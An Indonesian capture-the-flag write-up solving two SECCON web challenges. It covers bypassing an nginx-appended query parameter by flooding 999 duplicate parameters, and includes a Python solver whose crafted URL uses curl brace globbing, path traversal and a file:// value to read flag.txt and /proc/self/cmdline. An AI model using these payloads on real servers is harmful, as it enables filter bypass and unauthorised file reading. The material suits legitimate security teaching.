# web
---
## skipinx

### TL;DR
Kita hanya perlu membuat query proxy yang banyak saat mengirimkan HTTP request, sehingga nantinya server node-js akan men-truncate jumlah yang berlebihan yaitu sampai 999.

### Step
Pada challenge ini kita diberikan file berupa applikasi yang menggunakan express js. 
kita disuruh untuk membypass waf dari frontend server, waf-nya sebagai berikut

```nginx
server {
  listen 8080 default_server;
  server_name nginx;

  location / {
    set $args "${args}&proxy=nginx";
    proxy_pass http://web:3000;
  }
}
```

dimana kita akan diberikan query &proxy=nginx pada setiap requests yang kita buat, sehingga akan tertangkap oleh backend dan membuat kode dibawah ini ter trigger

```js
app.get("/", (req, res) => {
  console.log(req.query)
  req.query.proxy.includes("nginx") <- akan ter-trigger
    ? res.status(400).send("Access here directly, not via nginx :(") <- jika benar maka kita akan mendapatkan ini
    : res.send(`Congratz! You got a flag: ${FLAG}`);
});
```

agar prosess debugging web app ini jadi lebih mudah, saya perlu untuk mendeploy docker untuk memantau setiap request yang masuk, dan saya juga perlu untuk mengubah sedikit kode js-nya agar lebih mudah untuk kita mendebugging nantinya.

```js
...snip...
app.get("/", (req, res) => {
  console.log(req.query)// berguna untuk debugging
  req.query.proxy.includes("nginx")
    ? res.status(400).send("Access here directly, not via nginx :(")
    : res.send(`Congratz! You got a flag: ${FLAG}`);
});
...snip...
```

Kemudian jalankan docker

![](Pasted%20image%2020221113195707.png)

Dari sini kita bisa testing dengan mudah, kita coba-coba saja yang menurut kita bisa untuk membypass waf tersebut.

Awalnya saya mencoba untuk memasukkan char dari 1-255 kedalam query, tapi hasilnya nihil. Kemudian saya kepikiran untuk memberikan query yang banyak dan ternyata work. 

Bisa dilihat di log nginx pada docker yang tadi kita deploy, bahwa query terlimit sebanyak kurang lebih 1000 list.

![](Pasted%20image%2020221113195754.png)

Kita tinggal masukkan query proxy sebanyak 999 kali, dan kita mendapatkan flagnya!

![](Pasted%20image%2020221113195729.png)

## easylfi
### solver

```python
import requests

URL = "http://easylfi.seccon.games:3000"
# URL = "http://127.0.0.1:3000"

def req(url=URL):
    req = requests.Request("GET", url)
    res = req.prepare()
    payload = (
        "/{.}./{.}./{/proc/self/cmdline,flag.txt}" +  # bypass double dot
        "?" +
        # membuang SECCON dari output
        "&{/proc/self/cmdline,flag.txt}={" +
        "&{={}" +
        "&{}=}{" +
        "&{%00--_curl_--file:///app/public/../../flag.txt%0aSECCON}="
    )
    res.url = url + payload
    res = requests.Session().send(res)
    print(res.text)
req()
```